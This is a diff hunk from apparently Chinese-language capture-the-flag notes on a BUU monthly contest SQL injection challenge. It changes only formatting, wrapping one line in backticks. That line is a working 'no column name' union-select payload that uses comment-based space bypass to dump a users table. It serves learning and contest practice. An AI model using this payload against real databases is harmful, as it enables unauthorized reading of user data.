@@ -39,7 +39,7 @@ url中有个id的参数感觉是sql注入，然而id并不是注入点，返回�
 
 ![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%206.png)
 
-- 无列名注入 'union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
+- 无列名注入 `'union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22`
 
 ![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%207.png)
 
